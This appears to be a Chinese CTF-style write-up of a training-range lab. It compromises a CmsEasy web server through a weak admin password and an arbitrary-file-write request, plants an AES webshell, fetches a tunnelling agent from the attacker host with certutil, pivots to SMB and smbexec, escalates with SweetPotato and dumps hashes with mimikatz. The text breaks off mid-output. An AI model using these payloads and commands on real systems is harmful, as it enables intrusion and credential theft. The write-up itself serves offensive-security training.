{"pageProps":{"postData":{"id":"Cyberstrikelablab9","contentHtml":"<h1>lab9</h1>\n<blockquote>\n<p><a href=\"https://www.cyberstrikelab.com/#/target/kvm_detail/269\">https://www.cyberstrikelab.com/#/target/kvm_detail/269</a></p>\n</blockquote>\n<p>靶标介绍：ATT&#x26;CK实战框架-lab9</p>\n<p><strong>第一阶段：web 服务突破</strong></p>\n<p>核心动作：通过「特定凭证」登录后台管理系统</p>\n<p>关键操作：利用工具 A 抓取通信数据，植入「特殊代码片段」</p>\n<p>成果：成功建立「隐蔽连接通道」，获取基础权限</p>\n<p><strong>第二阶段：内网横向渗透</strong></p>\n<p>核心动作：从普通权限「层层递进」至最高系统权限</p>\n<p>关键操作：使用工具 B 完成「远控上线」，扫描「内网段资产」</p>\n<p>成果：破解「某协议共享密码」，直达核心数据区</p>\n<p><strong>第三阶段：域控终极突破</strong></p>\n<p>核心动作：检测「某证书服务漏洞」，伪造身份凭证</p>\n<p>关键操作：通过工具 C 生成「特殊格式证书」，模拟「高权限用户」</p>\n<p>成果：绕过域控防护，最终获取「系统关键标识」</p>\n<p>PS：校园网害人，一大半时间卡在上传文件，换流量就好了…</p>\n<h2>前期踩点</h2>\n<p>这里要使用 <code>5000</code> 的速率来扫，<code>10000</code> 速率大概率端口扫描不全</p>\n<pre><code class=\"hljs language-bash\">➜  Lab-9 nmap -sT -min-rate 5000 -p- 172.5.33.6\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-20 20:51 EDT\nStats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan\nConnect Scan Timing: About 69.47% <span class=\"hljs-keyword\">done</span>; ETC: 20:52 (0:00:08 remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> 172-5-33-6.lightspeed.miamfl.sbcglobal.net (172.5.33.6)\nHost is up (0.015s latency).\nNot shown: 65527 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n25/tcp    open  smtp\n80/tcp    open  http\n110/tcp   open  pop3\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n47001/tcp open  winrm\n49669/tcp open  unknown\n</code></pre>\n<p>无法使用匿名账户对<code>SMB</code>进行登录 （PS：下面这些是当时靶机BUG无法启动 Web 时测试的）</p>\n<pre><code class=\"hljs language-bash\">➜  Tools smbclient -L 172.5.33.6 -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n</code></pre>\n<p>进行<code>RPCdump</code>  ，能得到主机名 <code>WIN-784BAKDI0AC</code></p>\n<pre><code class=\"hljs language-bash\">➜  Tools rpcdump.py 172.5.33.6\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Retrieving endpoint list from 172.5.33.6\nProtocol: [MS-RSP]: Remote Shutdown Protocol\nProvider: wininit.exe\nUUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0\nBindings:\n          ncacn_ip_tcp:172.5.33.6[49664]\n          ncalrpc:[WindowsShutdown]\n          ncacn_np:\\\\WIN-784BAKDI0AC[\\PIPE\\InitShutdown]\n          ncalrpc:[WMsgKRpc04A670]\n\nProtocol: N/A\nProvider: winlogon.exe\nUUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0\nBindings:\n          ncalrpc:[WindowsShutdown]\n          ncacn_np:\\\\WIN-784BAKDI0AC[\\PIPE\\InitShutdown]\n          ncalrpc:[WMsgKRpc04A670]\n          ncalrpc:[WMsgKRpc04A971]\n          ....\n</code></pre>\n<p><code>fscan</code> 扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Tools ./fscan_1.8.4 -h 172.5.33.6                                 \n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n172.5.33.6:139 open\n172.5.33.6:80 open\n172.5.33.6:3306 open\n172.5.33.6:135 open\n172.5.33.6:445 open\n[*] alive ports len is: 5\nstart vulscan\n[*] NetInfo \n[*]172.5.33.6\n   [->]WIN-784BAKDI0AC\n   [->]172.5.33.6\n   [->]10.6.6.10\n[*] WebTitle http://172.5.33.6         code:200 len:77277  title:中文网页标题\n已完成 5/5\n[*] 扫描结束,耗时: 50.962777759s\n</span></code></pre>\n<p>因为可能是 <code>2008R2</code>，检测一下永恒之蓝，但是并没有</p>\n<p><img src=\"/post-images/Cyberstrikelablab9/image.png\" alt=\"image.png\"></p>\n<h2>Web 渗透 - 172.5.33.6</h2>\n<p><img src=\"/post-images/Cyberstrikelablab9/image1.png\" alt=\"image.png\"></p>\n<p>在页脚中能找到  <code>Powered by CmsEasy</code> ，易通企业网站系统</p>\n<h3>密码爆破</h3>\n<p><code>/admin</code> 进入后台登录接口，进行弱密码测试</p>\n<p>进行密码爆破时，需要将 <code>cookie</code> 和验证码参数删掉</p>\n<p><img src=\"/post-images/Cyberstrikelablab9/image2.png\" alt=\"image.png\"></p>\n<p>得到密码 <code>admin123456</code></p>\n<h3>后台利用</h3>\n<p>通过搜索引擎搜索，能找到几个命令执行的漏洞</p>\n<p>这里使用：<a href=\"https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Epoc\">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Epoc</a></p>\n<ol>\n<li>\n<p>首先将登陆后的 Cookie 拿过来利用</p>\n<pre><code class=\"hljs language-bash\">Cookie: PHPSESSID=r8olfavkomt6tla7pn9j306ue0; loginfalse74c6352c5a281ec5947783b8a186e225=21; loginfalse=0; login_username=admin; login_password=9776624e56cfa87e5d04672056ffeac9\n</code></pre>\n</li>\n<li>\n<p>构造数据包，将自己的 <code>Cookie</code> 替换上去即可</p>\n<pre><code class=\"hljs language-bash\">POST /index.php?<span class=\"hljs-keyword\">case</span>=template&#x26;act=save&#x26;admin_dir=admin&#x26;site=default HTTP/1.1\nHost: 172.5.33.6\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nReferer: http://172.5.33.6/index.php?<span class=\"hljs-keyword\">case</span>=admin&#x26;act=login&#x26;admin_dir=admin&#x26;site=default\nDNT: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0\nSec-GPC: 1\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nCookie: PHPSESSID=r8olfavkomt6tla7pn9j306ue0; loginfalse74c6352c5a281ec5947783b8a186e225=21; loginfalse=0; login_username=admin; login_password=9776624e56cfa87e5d04672056ffeac9\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 49\n\nsid=#data_d_.._d_.._d_.._d_1.php&#x26;slen=693&#x26;scontent=&#x3C;?php phpinfo();?>\n</code></pre>\n<p><img src=\"/post-images/Cyberstrikelablab9/image3.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>访问是否写入成功</p>\n<p><img src=\"/post-images/Cyberstrikelablab9/image4.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>写入冰蝎的<code>payload</code>（这里你也可以蚁剑）</p>\n<p>使用 <code>default_aes</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php\n@error_reporting(0);\n\t<span class=\"hljs-keyword\">function</span> Decrypt(<span class=\"hljs-variable\">$data</span>)\n\t{\n\t\t<span class=\"hljs-variable\">$key</span>=<span class=\"hljs-string\">\"e45e329feb5d925b\"</span>;\n\t\t<span class=\"hljs-built_in\">return</span> openssl_decrypt(base64_decode(<span class=\"hljs-variable\">$data</span>), <span class=\"hljs-string\">\"AES-128-ECB\"</span>, <span class=\"hljs-variable\">$key</span>,OPENSSL_PKCS1_PADDING);\n\t}\n<span class=\"hljs-variable\">$post</span>=Decrypt(file_get_contents(<span class=\"hljs-string\">\"php://input\"</span>));\n@<span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$post</span>);\n?>\n</code></pre>\n<p><img src=\"/post-images/Cyberstrikelablab9/image5.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/Cyberstrikelablab9/image6.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<p><img src=\"/post-images/Cyberstrikelablab9/image7.png\" alt=\"image.png\"></p>\n<p><code>flag 1</code></p>\n<pre><code class=\"hljs language-bash\">C:\\> <span class=\"hljs-built_in\">type</span> flag.txt\ngo-flag{8EC18759-1F45-4C34-9743-95DAABCA5CC1}\n</code></pre>\n<h2>代理 - Stowaway</h2>\n<p>查看 <code>IP</code> 信息，能发现内网网段是 <code>10.6.6.10</code></p>\n<pre><code class=\"hljs language-bash\">C:/phpstudy_pro/WWW/ >ipconfig\n\nWindows IP 配置\n\n以太网适配器 以太网实例 1:\n\n   连接特定的 DNS 后缀 . . . . . . . : \n   本地链接 IPv6 地址. . . . . . . . : fe80::54a5:afba:bf67:addf%11\n   IPv4 地址 . . . . . . . . . . . . : 172.5.33.6\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 172.5.33.233\n\n以太网适配器 以太网实例 2:\n\n   连接特定的 DNS 后缀 . . . . . . . : \n   本地链接 IPv6 地址. . . . . . . . : fe80::78bb:2e32:19c6:2d7%2\n   IPv4 地址 . . . . . . . . . . . . : 10.6.6.10\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 10.6.6.1\n\n隧道适配器 isatap.{730545FA-7DC0-4716-8AF2-678FFC6D1F1C}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开连接\n   连接特定的 DNS 后缀 . . . . . . . : \n\n隧道适配器 isatap.{E6E2FD25-6949-4C86-A749-7F0F14616295}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开连接\n   连接特定的 DNS 后缀 . . . . . . . : \n</code></pre>\n<p>通过 <code>stowaway</code> 来搭建代理，使用 <code>certutil</code> （<code>WebShell</code>没法进行上传，冰蝎蚁剑都是）拉取攻击机上的<code>stowaway</code> 客户端</p>\n<pre><code class=\"hljs language-bash\">C:/phpstudy_pro/WWW/ >certutil -f -<span class=\"hljs-built_in\">split</span> -urlcache http://172.16.233.2/agent.exe\n\n****  联机  ****\n  000000  ...\n  22c600\nCertUtil: -URLCache 命令成功完成。\n</code></pre>\n<p>服务端（攻击机）监听 <code>8000</code> 端口</p>\n<pre><code class=\"hljs language-bash\">.\\windows_x64_admin.exe -l 8000 -s 123\n</code></pre>\n<p>客户端连接服务端</p>\n<pre><code class=\"hljs language-bash\">C:/phpstudy_pro/WWW/ >agent.exe -c 172.16.233.2:8000 -s 123 --reconnect 8\n</code></pre>\n<p>客户端连接后服务端就能看到连接上了</p>\n<pre><code class=\"hljs language-bash\">PS D:\\All\\Study\\security\\tools\\stowaway> .\\windows_x64_admin.exe -l 8000 -s 123\n[*] Starting admin node on port 8000\n\n    .-<span class=\"hljs-string\">')    .-'</span>) _                  (<span class=\"hljs-string\">'\\ .-'</span>) /<span class=\"hljs-string\">'  ('</span>-.      (<span class=\"hljs-string\">'\\ .-'</span>) /<span class=\"hljs-string\">'  ('</span>-.\n   ( OO ). (  OO) )                  <span class=\"hljs-string\">'.( OO ),'</span> ( OO ).-.   <span class=\"hljs-string\">'.( OO ),'</span> ( OO ).-.\n   (_)---\\_)/     <span class=\"hljs-string\">'._  .-'</span>),-----. ,--./  .--.   / . --. /,--./  .--.   / . --. /  ,--.   ,--.\n   /    _ | |<span class=\"hljs-string\">'--...__)( OO'</span>  .-.  <span class=\"hljs-string\">'|      |  |   | \\-.  \\ |      |  |   | \\-.  \\    \\  '</span>.<span class=\"hljs-string\">'  /\n   \\  :'</span> <span class=\"hljs-string\">'. '</span>--.  .--<span class=\"hljs-string\">'/   |  | |  ||  |   |  |,.-'</span>-<span class=\"hljs-string\">'  |  ||  |   |  |,.-'</span>-<span class=\"hljs-string\">'  |  | .-'</span>)     /\n    <span class=\"hljs-string\">'..'</span><span class=\"hljs-string\">''</span>.)   |  |   \\_) |  |\\|  ||  |.<span class=\"hljs-string\">'.|  |_)\\| |_.'</span>  ||  |.<span class=\"hljs-string\">'.|  |_)\\| |_.'</span>  |(OO  \\   /\n   .-._)   \\   |  |     \\ |  | |  ||         |   |  .-.  ||         |   |  .-.  | |   /  /\\_\n   \\       /   |  |      <span class=\"hljs-string\">''</span>  <span class=\"hljs-string\">'-'</span>  <span class=\"hljs-string\">'|   ,'</span>.   |   |  | |  ||   ,<span class=\"hljs-string\">'.   |   |  | |  | '</span>-./  /.__)\n    <span class=\"hljs-string\">'-----'</span>    <span class=\"hljs-string\">'--'</span>        <span class=\"hljs-string\">'-----'</span> <span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span> <span class=\"hljs-string\">'--'</span><span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span> <span class=\"hljs-string\">'--'</span>   <span class=\"hljs-string\">'--'</span>\n                                    { v2.2  Author:ph4ntom }\n[*] Waiting <span class=\"hljs-keyword\">for</span> new connection...\n[*] Connection from node 172.5.33.6:49677 is <span class=\"hljs-built_in\">set</span> up successfully! Node <span class=\"hljs-built_in\">id</span> is 0\n(admin) >>\n</code></pre>\n<p>设置 <code>socks</code> 代理</p>\n<pre><code class=\"hljs language-bash\">(admin) >> use 0\n(node 0) >> socks 8001 admin admin\n[*] Trying to listen on 0.0.0.0:8001......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Socks start successfully!\n</span></code></pre>\n<p><code>Kali</code> 配置 <code>proxychains</code> 后进行测试</p>\n<pre><code class=\"hljs language-bash\">➜  ~ proxychains4 curl 10.6.6.10\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  172.16.233.2:8001  ...  10.6.6.10:80  ...  OK\n&#x3C;!DOCTYPE html>\n&#x3C;html>\n&#x3C;<span class=\"hljs-built_in\">head</span>>\n&#x3C;meta name=<span class=\"hljs-string\">\"Generator\"</span> content=<span class=\"hljs-string\">\"CmsEasy 7_7_5_20211012_UTF8\"</span> />\n    &#x3C;meta charset=<span class=\"hljs-string\">\"utf-8\"</span> />\n    &#x3C;meta name=<span class=\"hljs-string\">\"renderer\"</span> content=<span class=\"hljs-string\">\"webkit\"</span>/>\n    &#x3C;meta name=<span class=\"hljs-string\">\"force-rendering\"</span> content=<span class=\"hljs-string\">\"webkit\"</span>/>\n    &#x3C;meta http-equiv=<span class=\"hljs-string\">\"X-UA-Compatible\"</span> content=<span class=\"hljs-string\">\"IE=edge,chrome=1\"</span>>\n    &#x3C;meta name=<span class=\"hljs-string\">\"viewport\"</span> content=<span class=\"hljs-string\">\"width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui\"</span>>\n    &#x3C;title>中文网页标题&#x3C;/title>\n    ....\n</code></pre>\n<h2>内网信息收集</h2>\n<p>代理搭建完毕后，上传 <code>fscan</code> 对内网进行扫描</p>\n<pre><code class=\"hljs language-bash\">(node 0) >> upload D:\\fscan.exe C:\\phpstudy_pro\\www\\fscan.exe\n[*] File transmitting, please <span class=\"hljs-built_in\">wait</span>...\n8.33 MiB / 8.33 MiB [------------------------------------------------------------------->__] 96.69% 2.54 MiB p/s ETA 0s\n</code></pre>\n<p>使用 <code>fscan</code> 扫描</p>\n<pre><code class=\"hljs language-bash\">C:\\phpstudy_pro\\WWW>fscan.exe -h 10.6.6.1-10.6.6.255\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| <span class=\"hljs-string\">''</span>__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-05-22 05:44:45] [INFO] 暴力破解线程数: 1\n[2025-05-22 05:44:45] [INFO] 开始信息扫描\n[2025-05-22 05:44:45] [INFO] 生成IP范围: 10.6.6.1.%!d(string=10.6.6.255) - %!s(MISSING).%!d(MISSING)\n[2025-05-22 05:44:45] [INFO] 最终有效主机数量: 255\n[2025-05-22 05:44:45] [INFO] 开始主机扫描\n[2025-05-22 05:44:45] [SUCCESS] 目标 10.6.6.10       存活 (ICMP)\n[2025-05-22 05:44:46] [SUCCESS] 目标 10.6.6.55       存活 (ICMP)\n[2025-05-22 05:44:46] [SUCCESS] 目标 10.6.6.88       存活 (ICMP)\n[2025-05-22 05:44:48] [INFO] 存活主机数量: 3\n[2025-05-22 05:44:48] [INFO] 有效端口数量: 233\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.55:135\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.10:135\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.55:88\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.55:80\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.10:80\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.88:135\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.88:445\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.55:445\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.10:445\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.55:389\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.88:139\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.55:139\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.10:139\n[2025-05-22 05:44:53] [SUCCESS] 端口开放 10.6.6.10:3306\n[2025-05-22 05:44:54] [SUCCESS] 服务识别 10.6.6.55:88 =>\n[2025-05-22 05:44:54] [SUCCESS] 服务识别 10.6.6.10:80 => [http]\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.88:445 =>\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.55:445 =>\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.10:445 =>\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.55:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: cyberstrikelab.com, Site: Default-First-Site-Name\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.88:139 =>  Banner:[.]\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.55:139 =>  Banner:[.]\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.10:139 =>  Banner:[.]\n[2025-05-22 05:44:57] [SUCCESS] 服务识别 10.6.6.55:80 => [http]\n[2025-05-22 05:44:57] [SUCCESS] 服务识别 10.6.6.10:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[H.j Host <span class=\"hljs-string\">'WIN-784BAKDI0AC'</span> is not allowed to connect to this MySQL server]\n[2025-05-22 05:45:54] [SUCCESS] 服务识别 10.6.6.55:135 =>\n[2025-05-22 05:45:54] [SUCCESS] 服务识别 10.6.6.10:135 =>\n[2025-05-22 05:45:54] [SUCCESS] 服务识别 10.6.6.88:135 =>\n[2025-05-22 05:45:54] [INFO] 存活端口数量: 14\n[2025-05-22 05:45:54] [INFO] 开始漏洞扫描\n[2025-05-22 05:45:54] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-05-22 05:45:55] [SUCCESS] 网站标题 http://10.6.6.10          状态码:200 长度:77272  标题:中文网页标题\n[2025-05-22 05:45:55] [SUCCESS] NetInfo 扫描结果\n目标主机: 10.6.6.88\n主机名: cyberweb\n发现的网络接口:\n   IPv4地址:\n      └─ 10.6.6.88\n[2025-05-22 05:45:55] [SUCCESS] NetInfo 扫描结果\n目标主机: 10.6.6.10\n主机名: WIN-784BAKDI0AC\n发现的网络接口:\n   IPv4地址:\n      └─ 172.5.33.6\n      └─ 10.6.6.10\n[2025-05-22 05:45:55] [SUCCESS] NetInfo 扫描结果\n目标主机: 10.6.6.55\n主机名: DC\n发现的网络接口:\n   IPv4地址:\n      └─ 10.6.6.55\n[2025-05-22 05:45:55] [SUCCESS] 网站标题 http://10.6.6.55          状态码:200 长度:703    标题:IIS Windows Server\n[2025-05-22 05:45:55] [INFO] 系统信息 10.6.6.55 [Windows Server 2016 Standard 14393]\n[2025-05-22 05:45:55] [INFO] 系统信息 10.6.6.88 [Windows Server 2016 Standard 14393]\n[2025-05-22 05:45:56] [SUCCESS] NetBios 10.6.6.88       cyberweb.cyberstrikelab.com         Windows Server 2016 Standard 14393\n[2025-05-22 05:45:56] [SUCCESS] 目标: http://10.6.6.55:80\n  漏洞类型: poc-yaml-active-directory-certsrv-detect\n  漏洞名称:\n  详细信息:\n        author:AgeloVito\n        links:https://www.cnblogs.com/EasonJim/p/6859345.html\n[2025-05-22 05:46:53] [INFO] SMB2共享信息 10.6.6.88:445 admin Pass:123456 共享:[ADMIN$ C$ IPC$ smb]\n[2025-05-22 05:47:10] [SUCCESS] SMB认证成功 10.6.6.88:445 administrator:qwe123!@#\n</code></pre>\n<p>从上面的信息中能得到：</p>\n<ol>\n<li>域：<code>cyberstrikelab.com</code></li>\n<li>DC：<code>10.6.6.55</code> <code>DC.cyberstrikelab.com</code></li>\n<li><code>cyberweb.cyberstrikelab.com</code> 管理员账户 <code>administrator:qwe123!@#</code></li>\n</ol>\n<h2>cyberweb - 10.6.6.88</h2>\n<p>上面拿到了凭据，信息收集一波</p>\n<pre><code class=\"hljs language-bash\">➜  Lab-9 proxychains -q crackmapexec smb 10.6.6.88 -u administrator -p <span class=\"hljs-string\">'qwe123!@#'</span>\nSMB         10.6.6.88       445    CYBERWEB         [*] Windows Server 2016 Standard 14393 x64 (name:CYBERWEB) (domain:cyberstrikelab.com) (signing:False) (SMBv1:True)\nSMB         10.6.6.88       445    CYBERWEB         [-] cyberstrikelab.com\\administrator:qwe123!@# STATUS_LOGON_FAILURE \n\n➜  Lab-9 proxychains -q crackmapexec smb 10.6.6.88 -u administrator -p <span class=\"hljs-string\">'qwe123!@#'</span> --local-auth\nSMB         10.6.6.88       445    CYBERWEB         [*] Windows Server 2016 Standard 14393 x64 (name:CYBERWEB) (domain:CYBERWEB) (signing:False) (SMBv1:True)\nSMB         10.6.6.88       445    CYBERWEB         [+] CYBERWEB\\administrator:qwe123!@# (Pwn3d!)\n</code></pre>\n<p>只能进行本地验证，没有域用户，需要进行提权到<code>SYSTEM</code> ，然后通过 <code>SYSTEM</code> 抓取机器用户或者域用户来进行<code>ESC</code>攻击</p>\n<p>因为靶机介绍中，提到某证书服务漏洞，那么肯定就是<code>ADCS</code>了，但是<code>ESC</code>几还不知道，<code>CA</code>也还不知道</p>\n<p>使用 <code>smbexec</code> 获得 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">➜  Lab-9 proxychains -q smbexec.py administrator:<span class=\"hljs-string\">'qwe123!@#'</span>@10.6.6.88 -codec gbk\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[!] Launching semi-interactive shell - Careful what you execute\nC:\\Windows\\system32>\n</code></pre>\n<p><code>flag 2</code></p>\n<pre><code class=\"hljs language-bash\">go-flag{0A433C09-0529-4205-848D-6DADCE311646}\n</code></pre>\n<p><code>whoami</code> 信息中能看到 <code>SeImpersonatePrivilege</code> 权限，可以使用 <code>SweetPotato</code> 进行提权，拥有该权限可以将 <code>Administration</code> 用户提权到 <code>SYSTEM</code> 。关于土豆家族提权原理：<a href=\"https://xz.aliyun.com/news/7371\">https://xz.aliyun.com/news/7371</a></p>\n<p><img src=\"/post-images/Cyberstrikelablab9/image8.png\" alt=\"image.png\"></p>\n<p>开启 <code>RDP</code> 服务</p>\n<pre><code class=\"hljs language-bash\">C:\\Windows\\system32>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n操作成功完成。\nC:\\Windows\\system32>netsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\n确定。\n</code></pre>\n<p>进行远程桌面连接</p>\n<p><img src=\"/post-images/Cyberstrikelablab9/image9.png\" alt=\"image.png\"></p>\n<p>上传 <code>SweetPotato</code> 和 <code>mimikatz</code></p>\n<p>使用 <code>SweetPotato</code> 进行提权，获得<code>SYSTEM</code> 权限</p>\n<p><img src=\"/post-images/Cyberstrikelablab9/image10.png\" alt=\"image.png\"></p>\n<h2>DC - 10.6.6.55</h2>\n<p>提权后使用 <code>mimikatz</code> 抓取机器账户 <code>hash</code></p>\n<pre><code class=\"hljs language-bash\">C:\\mimikatz-master\\x64>\n\n  .#####.   mimikatz 2.2.0 (x64) <span class=\"hljs-comment\">#18362 Feb 29 2020 11:13:36</span>\n .## ^ <span class=\"hljs-comment\">##.  \"A La Vie, A L'Amour\" - (oe.eo)</span>\n <span class=\"hljs-comment\">## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>\n <span class=\"hljs-comment\">## \\ / ##       > http://blog.gentilkiwi.com/mimikatz</span>\n <span class=\"hljs-string\">'## v ##'</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  <span class=\"hljs-string\">'#####'</span>        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz <span class=\"hljs-comment\">#</span>\nUsing <span class=\"hljs-string\">'mimikatz.log'</span> <span class=\"hljs-keyword\">for</span> logfile : OK\n\nmimikatz <span class=\"hljs-comment\">#</span>\nPrivilege <span class=\"hljs-string\">'20'</span> OK\n\nmimikatz <span class=\"hljs-comment\">#</span>\n\nAuthentication Id : 0 ; 1769582 (00000000:001b006e)\nSession           : Interactive from 3\nUser Name         : DWM-3\nDomain            : Window Manager\nLogon Server      : (null)\n\nLogon Time        : 2025/5/22 14:14:10\nSID               : S-1-5-90-0-3\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n\n        wdigest :\n\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password :\n(null)\n        kerberos :\n\n         * Username : CYBERWEB$\n         * Domain   : cyberstrikelab.com\n         * Password :\nI@w2(l8:<span class=\"hljs-variable\">$e9</span>`bRA7&#x26;<span class=\"hljs-variable\">$Rxd</span>^f@6+_,hg\\L)&#x26;Ck6he8vlsS7*=[e*%bh-wZ.,<span class=\"hljs-variable\">$HV</span>(0^!/q0eY=sDH_1)6jK3v;#%kt[5YSXt3<span class=\"hljs-variable\">$y</span>/;R(wAqp1p_`<span class=\"hljs-string\">\"m=o:Q;HtsY\n        ssp :\n\n        credman :\n\nAuthentication Id : 0 ; 51166 (00000000:0000c7de)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:29\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : CYBERWEB$\n         * Domain   : cyberstrikelab.com\n         * Password : I@w2(l8:<span class=\"hljs-variable\">$e9</span>`bRA7&#x26;<span class=\"hljs-variable\">$Rxd</span>^f@6+_,hg\\L)&#x26;Ck6he8vlsS7*=[e*%bh-wZ.,<span class=\"hljs-variable\">$HV</span>(0^!/q0eY=sDH_1)6jK3v;#%kt[5YSXt3<span class=\"hljs-variable\">$y</span>/;R(wAqp1p_`\"</span><span class=\"hljs-string\">\"m=o:Q;HtsY\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : CYBERWEB$\nDomain            : CYBERSTRIKELAB\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:23\nSID               : 